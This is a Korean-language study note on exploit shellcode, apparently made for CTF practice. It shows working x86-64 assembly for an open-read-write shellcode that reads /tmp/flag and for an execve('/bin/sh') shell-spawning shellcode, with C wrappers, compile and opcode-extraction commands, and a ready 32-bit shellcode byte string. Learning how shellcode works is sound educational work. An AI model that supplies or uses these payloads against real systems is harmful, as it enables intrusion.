# Explit Tech  
익스플로잇(Exploit): 상대 시스템을 공격하는 것  
9가지 공격 기법 소개  

## 1. Shellcode  
익스플로잇을 위해 제작된 어셈블리 코드 조각  
셸을 획득하기 위한 목적으로 셸코드 사용  

해커가 rip를 자신이 작성한 셸코드로 옮길 수 있으면 해커는 원하는 어셈블리 코드가 실행되게할 수 있음  
어셈블리어는 기계어와 거의 일대일 대응, 사실상 원하는 모든 명령을 CPU에 내릴 수 있게 됨  

공격을 수행할 아키텍처, 운영체제, 셸코드의 목적에 따라 다르게 작성됨  
아키텍처 별로 자주 사용되는 셸코드 [모음집](http://shell-storm.org/shellcode/index.html)  

### orw(open-read-write)  
파일 읽고 쓰기  
파일을 열고, 읽은 뒤 화면에 출력해주는 셸 코드  

* /tmp/flag를 읽는 셸 코드  

의사 코드로 표현  
```
char buf[0x30];
int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```

<img width="630" alt="image" src="https://user-images.githubusercontent.com/46364778/216364366-34989a78-3f5e-46ff-b48b-08062a80c03d.png">  

syscall의 반환값은 rax로 저장  

> fd란?  
> 파일 서술자(File Descriptor, fd)는 유닉스 계열의 운영체제에서 파일에 접근하는 소프트웨어에 제공하는 가상의 접근 제어자입니다.  
> 프로세스마다 고유의 서술자 테이블을 갖고 있으며, 그 안에 여러 파일 서술자를 저장합니다.  
> 서술자 각각은 번호로 구별되는데, 일반적으로 0번은 일반 입력(Standard Input, STDIN), 1번은 일반 출력(Standard Output, STDOUT), 2번은 일반 오류(Standard Error, STDERR)에 할당되어 있으며, 이들은 프로세스를 터미널과 연결해줍니다.    
> 그래서 우리는 키보드 입력을 통해 프로세스에 입력을 전달하고, 출력을 터미널로 받아볼 수 있습니다.  
> 프로세스가 생성된 이후, 위의 open같은 함수를 통해 어떤 파일과 프로세스를 연결하려고 하면, 기본으로 할당된 2번 이후의 번호를 새로운 fd에 차례로 할당해줍니다.  
> 그러면 프로세스는 그 fd를 이용하여 파일에 접근할 수 있습니다.  

```
;Name: orw.S

push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)

mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```  

#### orw 셸 코드 컴파일 및 실행  
실행가능한 파일의 형식 -> 윈도우는 PE, 리눅스는 ELF  
ELF(Executable and Linkable Format) = 헤더 + 코드 + 기타 데이터  
헤더: 실행에 필요한 여러 정보  
코드: CPU가 이해할 수 있는 기계어 코드  

orw.S는 아스키로 작성된 어셈블리어 코드 -> 기계어로 치환하면 CPU가 이해할 수 있음  
But ELF 형식이 아니므로 리눅스에서 실행될 수는 없음 -> gcc 컴파일 통해 ELF 형식으로 변형  

```
// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");
    
void run_sh();

int main() { run_sh(); }
```    

/tmp/flag의 데이터 외에도 알 수 없는 문자열이 출력됨 -> 초기화되지 않은 메모리 영역 사용에 의한 것  

> 초기화 되지 않은 메모리 사용(Use of Uninitialized Memory). 
> 스택은 앞서 얘기했듯 다양한 함수들이 공유하는 메모리 자원입니다.  
> 각 함수가 자신들의 스택 프레임을 할당해서 사용하고, 종료될 때 해제합니다.   
> 그런데 스택에서 해제라는 것은 사용한 영역을 0으로 초기화하는 것이 아니라, 단순히 rsp와 rbp를 호출한 함수의 것으로 이동시키는 것을 말합니다.  
> 즉, 어떤 함수를 해제한 이후, 다른 함수가 스택 프레임을 그 위에 할당하면, 이전 스택 프레임의 데이터는 여전히 새로 할당한 스택 프레임에 존재하게 됩니다.  
> 우리는 이를 쓰레기 값(garbage data)이라고 표현하기도 합니다.  
> 프로세스는 쓰레기 값 때문에 때때로 예상치 못한 동작을 하기도 하며, 해커에게 의도치 않게 중요한 정보를 노출하기도 합니다.  
> 따라서 이런 위험으로부터 안전한 프로그램을 작성하려면 스택이나 힙을 사용할 때 항상 적절한 초기화 과정을 거쳐야 합니다.  
> 이로부터 안전한 프로그램을 작성하는 방법은 시큐어 코딩 커리큘럼에서, 그리고 이를 이용한 다양한 공격방법은 시스템 해킹 심화 커리큘럼에서 다루도록 하겠습니다.  
> ex) 중요한 값을 유출해 내는 것을 메모리 릭(Memory Leak) -> 보호 기법을 무력화하는 핵심 역할  

### execve  
셸 획득 -> 시스템을 제어할 수 있게 됨  
셸(Shell): 운영체제에 명령을 내리기 위해 사용되는 사용자의 인터페이스  
커널(Kernel, 호두 속 내용물)  

최신의 리눅스 대부분 sh, bash를 기본 셸 프로그램으로 탑재 + zsh, tsh 등의 셸을 유저가 설치해서 사용  
Ubuntu 18.04에도 /bin/sh가 존재  

#### execve("/bin/sh", null, null)  
execve 셸 코드는 execve 시스템 콜만으로 구성됨  

<img width="629" alt="image" src="https://user-images.githubusercontent.com/46364778/216378767-1151bad9-6650-47a3-adcb-392a0b6ae4f2.png">  
argv는 실행파일에 넘겨줄 인자  
envp는 환경변수  
우리는 sh만 실행하면 되므로 다른 값들은 전부 null로 설정해줘도 됨  

리눅스에서는 기본 실행 프로그램들이 /bin/ 디렉토리에 저장되어 있으며, sh도 여기에 저장되어 있음  
-> execve("/bin/sh", null, null) 실행하는 것을 목표로 셸 코드를 작성하면 됨  

```
;Name: execve.S

mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```  

셸코드 예제
```
// File name: execve.c
// Compile Option: gcc -o execve execve.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "mov rax, 0x68732f6e69622f\n"
    "push rax\n"
    "mov rdi, rsp  # rdi = '/bin/sh'\n"
    "xor rsi, rsi  # rsi = NULL\n"
    "xor rdx, rdx  # rdx = NULL\n"
    "mov rax, 0x3b # rax = sys_execve\n"
    "syscall       # execve('/bin/sh', null, null)\n"
    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");
    
void run_sh();

int main() { run_sh(); }
```  

#### objdump를 이용한 shellcode 추출  
작성한 shellcode를 byte code(opcode) 형태로 추출하는 방법  

```
; File name: shellcode.asm

section .text
global _start
_start:
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al, 0xb
int    0x80
```

```
$ sudo apt-get install nasm
$ nasm -f elf shellcode.asm
$ objdump -d shellcode.o
```   

```
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
```. 

그럼 아래와 같이 손쉽게 바이트코드를 얻을 수 있음  
```
execve /bin/sh shellcode: 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```  


